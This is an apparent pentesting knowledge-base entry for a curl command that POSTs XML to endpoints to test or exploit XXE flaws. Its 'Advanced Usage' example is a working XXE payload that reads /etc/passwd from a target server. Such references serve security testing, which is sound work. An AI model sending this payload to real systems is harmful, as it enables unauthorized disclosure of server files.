---
data: 'curl -X POST [URL] -H "Content-Type: application/xml" -d ''[XML_PAYLOAD]'''
tags:
  - http
  - xxe
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 60cd2ee7-7a13-474f-978e-9d6c0704cb3a
created_at: '2025-12-13T09:00:27.591Z'
updated_at: '2025-12-13T09:00:27.591Z'
verified: false
validated: true
submitted: true
---
# curl-send-xml-payload

## Command

```bash
curl -X POST [URL] -H "Content-Type: application/xml" -d '[XML_PAYLOAD]'
```

## Description

Sends an XML payload via POST request to test or exploit XML-processing endpoints, useful for XXE vulnerabilities.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method | Yes |
| `-H "Content-Type: application/xml"` | Sets XML content type | Yes |
| `-d '[XML_PAYLOAD]'` | Data payload | Yes |
| `[URL]` | Target endpoint | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://target.com/endpoint -H "Content-Type: application/xml" -d '<xml>test</xml>'
```

### Advanced Usage

```bash
curl -X POST https://target.com/endpoint -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
```

## Expected Output

HTTP response containing parsed XML or disclosed file contents if vulnerable.

## Related
- [[procedures/Craft-and-Send-XXE-Payload]]
- [[tools/Curl]]
